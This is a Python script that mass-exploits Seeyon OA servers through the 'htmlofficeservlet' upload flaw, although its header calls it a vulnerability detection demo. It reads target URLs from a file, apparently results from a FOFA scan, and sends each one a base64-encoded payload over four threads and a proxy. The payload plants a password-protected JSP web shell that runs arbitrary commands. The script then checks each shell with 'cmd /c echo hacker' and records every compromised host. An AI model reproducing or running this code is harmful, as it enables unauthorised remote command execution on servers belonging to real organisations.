#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# __author__:leezp
# __date__:2019-07-01
# Local:  Win7 (python3)
# 上传，网站脆弱性检测 demo
# ***Configure the agent before running***
# 建议每次跑不超过100个，可以加个超时时间
# 批量测试，返回一个vulnerable url
import requests
import base64
import json
import queue
import threading
import urllib
from urllib import request

q = queue.Queue()

# 读取json文件， 为从navicat导出的json结构数据
'''
with open("fofa_spider.json", 'r', encoding='UTF-8') as f:
    temp = json.loads(f.read())
for i in temp['RECORDS']:
    q.put('http://' + i['ip'] + ':' + str(i['port']))  # http://  必须加 http://   才可用 requests.post 访问
'''

# 读取 txt
file = open('url.txt')  # encoding='UTF-8'
for x in file.readlines():
    # 这里一定要看清楚自己的url.txt 格式
    q.put(x.split(',')[0])
    # q.put(('http://' + x).strip())

# 这是代理IP
proxies = [{'http': '127.0.0.1:1081', 'https': 'socks5h://127.0.0.1:1081'}]  # 使用时需要ss填写正确，并且关闭代理软件
# 创建ProxyHandler
httpproxy_handler = urllib.request.ProxyHandler(proxies[0])
nullproxy_handler = urllib.request.ProxyHandler({})
# 定义一个代理开关
proxySwitch = True
# 根据代理开关是否打开，使用不同的代理模式
if proxySwitch:
    # 创建Opener
    opener = urllib.request.build_opener(httpproxy_handler)
else:
    opener = urllib.request.build_opener(nullproxy_handler)

headers = [{
    # 'Content-Type':'text/xml',
    'User-Agent':
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}]

post_payload = "REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkZDFRNXlpS1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpe1N0cmluZ0J1aWxkZXIgbGluZSA9IG5ldyBTdHJpbmdCdWlsZGVyKCk7dHJ5IHtQcm9jZXNzIHBybyA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoYyk7QnVmZmVyZWRSZWFkZXIgYnVmID0gbmV3IEJ1ZmZlcmVkUmVhZGVyKG5ldyBJbnB1dFN0cmVhbVJlYWRlcihwcm8uZ2V0SW5wdXRTdHJlYW0oKSkpO1N0cmluZyB0ZW1wID0gbnVsbDt3aGlsZSAoKHRlbXAgPSBidWYucmVhZExpbmUoKSkhPSBudWxsKSB7bGluZS5hcHBlbmQodGVtcCArICJcbiIpO31idWYuY2xvc2UoKTt9Y2F0Y2goRXhjZXB0aW9uIGUpIHtsaW5lLmFwcGVuZChlLmdldE1lc3NhZ2UoKSk7fXJldHVybiBsaW5lLnRvU3RyaW5nKCk7fSU+PCVpZiAoInBpbmciLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpJiYhIiIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSkpIHtvdXQucHJpbnRsbigiPHByZT4iICsgZXhjdXRlQ21kKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSkrICI8L3ByZT4iKTt9IGVsc2Uge291dC5wcmludGxuKCI6LSkiKTt9JT42ZTRmMDQ1ZDRiODUwNmJmNDkyYWRhN2UzMzkwZDdjZQ=="
post_payload = base64.b64decode(post_payload)

print("============Write the cmdshell started!==============\n")


def cmd():
    while not q.empty():
        # 访问网址
        url = q.get()
        requests.packages.urllib3.disable_warnings()
        try:
            request_post = urllib.request.Request(url=url + '/seeyon/htmlofficeservlet', data=post_payload,
                                                  headers=headers[0])
            response_post = opener.open(request_post)
            # 是否post成功,用get测试（要对url编码）
            request_get = urllib.request.Request(
                url=url + '/seeyon/ping123456.jsp?pwd=ping&cmd=cmd%20%2Fc%20echo%20hacker',
                headers=headers[0])
            # get 请求这里 cmd%20%2Fc%20echo%20hacker 一定要url编码
            try:
                response_get = opener.open(request_get)
                if 'hacker' in response_get.read().decode("utf-8"):
                    print(
                        '!=========Write to successful :' + url + '/seeyon/ping123456.jsp?pwd=ping&cmd=cmd+/c+echo+hacker' + ' ===============!!!')
                    with open('success.txt', 'a') as f:
                        f.write(url + '/seeyon/ping123456.jsp?pwd=ping&cmd=cmd+/c+echo+hacker' + '\n')
                else:
                    print(url + ' failed')
            except:
                request_err = urllib.request.Request(
                    url=url + '/seeyon/htmlofficeservlet',
                    headers=headers[0])
                response_err = opener.open(request_err).read().decode("utf-8")
                print(url + '/seeyon/htmlofficeservlet ' + response_err + ' 404')
                pass
        except:
            print(url + ' 500 postfailed')
            pass


# 线程队列部分
th = []
th_num = 4
for x in range(th_num):
    t = threading.Thread(target=cmd)
    th.append(t)
for x in range(th_num):
    th[x].start()
for x in range(th_num):
    th[x].join()
